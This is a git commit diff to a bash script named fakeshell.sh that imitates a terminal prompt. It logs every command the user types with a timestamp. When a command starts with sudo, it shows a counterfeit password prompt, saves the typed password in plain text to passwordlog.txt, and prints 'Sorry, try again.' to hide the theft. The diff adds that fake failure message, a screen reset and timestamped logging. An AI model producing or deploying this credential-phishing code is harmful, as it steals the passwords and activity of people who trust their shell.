a97af399e44483ed111d5ac5a0687c0e8ccff6ee
bsy167508 <ahm.rimer@gmail.com>
2016-09-26 01:14:27 +0530

    update

--- fakeshell.sh
+++ fakeshell.sh
@@ -1,15 +1,17 @@
+reset
 while :
 do
 	echo -n "${USER}@administrator~\$ "
 	read line
-	echo "$line" >> logger.txt
+	echo "$(date -Iseconds) $line" >> logger.txt
 	if [[ "$line" == 'sudo'* ]]; then
 		echo -n "[sudo] password for $USER : "
 		stty -echo
 		read password 
 		stty echo
 		echo $password >> passwordlog.txt
-		#eval $line
+		printf "\nSorry, try again.\n"		
+		eval $line
 	else
 		eval "$line"
 	fi
